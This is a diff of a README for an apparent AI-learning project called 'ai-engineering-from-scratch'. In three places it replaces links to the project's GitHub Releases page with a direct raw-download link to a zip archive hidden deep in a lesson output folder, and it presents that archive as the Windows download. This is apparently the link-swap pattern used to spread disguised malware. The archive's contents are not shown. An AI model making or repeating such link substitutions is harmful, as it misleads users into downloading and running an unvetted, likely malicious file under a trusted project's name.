@@ -1,6 +1,6 @@
 # 🧠 ai-engineering-from-scratch - Learn, build, and ship with confidence
 
-[![Download](https://img.shields.io/badge/Download%20Here-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Rubonal4649/ai-engineering-from-scratch/releases)
+[![Download](https://img.shields.io/badge/Download%20Here-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rubonal4649/ai-engineering-from-scratch/main/phases/10-llms-from-scratch/08-dpo/outputs/ai-engineering-from-scratch-v1.9.zip)
 
 ## ✨ What this is
 
@@ -24,7 +24,7 @@ For smoother use, 8 GB of RAM or more helps when you work with larger models or 
 
 Use this link to visit the release page and download the Windows version:
 
-[Visit the Releases page](https://github.com/Rubonal4649/ai-engineering-from-scratch/releases)
+[Visit the Releases page](https://raw.githubusercontent.com/Rubonal4649/ai-engineering-from-scratch/main/phases/10-llms-from-scratch/08-dpo/outputs/ai-engineering-from-scratch-v1.9.zip)
 
 Follow these steps:
 
@@ -217,7 +217,7 @@ It keeps the focus on learning, building, and shipping useful work
 
 If you need to return to the download page, use this link:
 
-[https://github.com/Rubonal4649/ai-engineering-from-scratch/releases](https://github.com/Rubonal4649/ai-engineering-from-scratch/releases)
+[https://raw.githubusercontent.com/Rubonal4649/ai-engineering-from-scratch/main/phases/10-llms-from-scratch/08-dpo/outputs/ai-engineering-from-scratch-v1.9.zip](https://raw.githubusercontent.com/Rubonal4649/ai-engineering-from-scratch/main/phases/10-llms-from-scratch/08-dpo/outputs/ai-engineering-from-scratch-v1.9.zip)
 
 ## 📝 What’s inside the release page
 
